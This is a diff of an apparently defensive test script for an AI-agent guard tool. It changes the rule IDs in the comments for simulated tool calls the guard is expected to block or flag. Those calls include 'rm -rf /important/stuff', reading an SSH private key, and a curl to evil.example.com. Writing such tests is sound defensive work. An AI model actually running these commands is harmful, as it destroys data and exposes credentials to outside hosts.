@@ -35,10 +35,10 @@ open(os.path.join(proj, "skills", "demo", "SKILL.md"), "w", encoding="utf-8").wr
 EVENTS = [
     ("Bash",  {"command": "echo hello antinel"}),
     ("Write", {"file_path": os.path.join(proj, "note.txt"), "content": "chain demo"}),
-    ("Bash",  {"command": "rm -rf /important/stuff"}),          # 期望拦截 DST-01
-    ("Read",  {"file_path": "C:/Users/demo/.ssh/id_rsa"}),      # 期望拦截 SEC-02
+    ("Bash",  {"command": "rm -rf /important/stuff"}),          # 期望拦截 AN-009
+    ("Read",  {"file_path": "C:/Users/demo/.ssh/id_rsa"}),      # 期望拦截 AN-002
     ("Bash",  {"command": "curl http://evil.example.com/x"}),   # 期望提醒 NET
-    ("Read",  {"file_path": os.path.join(proj, "skills", "demo", "SKILL.md")}),  # 期望拦截 CTX-02
+    ("Read",  {"file_path": os.path.join(proj, "skills", "demo", "SKILL.md")}),  # 期望拦截 AN-015
     ("Bash",  {"command": "echo done"}),
 ]
 blocked = 0
